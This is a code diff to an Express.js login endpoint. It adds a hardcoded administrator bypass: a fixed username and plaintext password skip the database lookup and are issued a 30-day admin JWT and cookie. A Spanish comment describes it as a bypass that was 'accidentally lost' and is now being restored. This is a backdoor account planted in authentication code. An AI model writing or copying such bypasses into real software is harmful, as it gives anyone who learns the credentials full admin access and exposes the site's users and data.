@@ -176,6 +176,26 @@ apiRouter.post(`/api/login`, async (req, res) => {
     const { username, password } = req.body;
     if (!username || !password) return res.status(400).json({ error: 'Usuario y contraseña requeridos.' });
 
+    // Hardcoded Admin Bypass que perdimos accidentalmente
+    if (username === 'Adim' && password === 'vamossusan') {
+        const token = jwt.sign(
+            { email: 'admin@shokyuucards.com', username: 'Adim', role: 'admin' }, 
+            JWT_SECRET, 
+            { expiresIn: '30d' }
+        );
+        
+        const cookieOptions = { 
+            httpOnly: true, 
+            secure: NODE_ENV !== 'local', 
+            sameSite: 'Lax',
+            maxAge: 30 * 24 * 60 * 60 * 1000 
+        };
+        if (NODE_ENV !== 'local') cookieOptions.domain = '.fullscreencode.com';
+        
+        res.cookie('fsc_token', token, cookieOptions);
+        return res.json({ success: true, user: { username: 'Adim', email: 'admin@shokyuucards.com' }, token });
+    }
+
     try {
         const db = await connectToDatabaseWrapper();
         const user = await db.collection('users').findOne({
